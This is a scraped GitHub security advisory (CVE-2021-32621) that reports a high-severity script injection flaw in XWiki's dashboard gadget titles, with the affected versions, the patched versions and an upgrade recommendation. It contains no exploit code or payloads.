© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_baa43dd3_20250115_080104.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fxwiki%2Fxwiki-platform%2Fsecurity%2Fadvisories%2FGHSA-h353-hc43-95vc)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fxwiki%2Fxwiki-platform%2Fsecurity%2Fadvisories%2FGHSA-h353-hc43-95vc)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=xwiki%2Fxwiki-platform)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[xwiki](/xwiki)
/
**[xwiki-platform](/xwiki/xwiki-platform)**
Public

* [Notifications](/login?return_to=%2Fxwiki%2Fxwiki-platform) You must be signed in to change notification settings
* [Fork
  554](/login?return_to=%2Fxwiki%2Fxwiki-platform)
* [Star
   1k](/login?return_to=%2Fxwiki%2Fxwiki-platform)

* [Code](/xwiki/xwiki-platform)
* [Pull requests
  139](/xwiki/xwiki-platform/pulls)
* [Actions](/xwiki/xwiki-platform/actions)
* [Projects
  0](/xwiki/xwiki-platform/projects)
* [Security](/xwiki/xwiki-platform/security)
* [Insights](/xwiki/xwiki-platform/pulse)

Additional navigation options

* [Code](/xwiki/xwiki-platform)
* [Pull requests](/xwiki/xwiki-platform/pulls)
* [Actions](/xwiki/xwiki-platform/actions)
* [Projects](/xwiki/xwiki-platform/projects)
* [Security](/xwiki/xwiki-platform/security)
* [Insights](/xwiki/xwiki-platform/pulse)

# Script injection without script or programming rights through Gadget titles

High

[surli](/surli)
published
GHSA-h353-hc43-95vc
May 18, 2021

## Package

maven

org.xwiki.platform:xwiki-platform-dashboard
([Maven](/advisories?query=ecosystem%3Amaven))

## Affected versions

> 3.0M3

## Patched versions

12.6.7, 12.10.3, 13.0RC1

## Description

### Impact

A user without Script or Programming right is able to execute script requiring privileges by editing gadget titles in the dashboard.

### Patches

The issue has been patched in XWiki 12.6.7, 12.10.3 and 13.0RC1.

### Workarounds

There's no easy workaround for this issue, it is recommended to upgrade XWiki.

### References

<https://jira.xwiki.org/browse/XWIKI-17794>

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [JIRA](https://jira.xwiki.org)
* Email us at XWiki security mailing-list

### Severity

High

### CVE ID

CVE-2021-32621

### Weaknesses

No CWEs

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


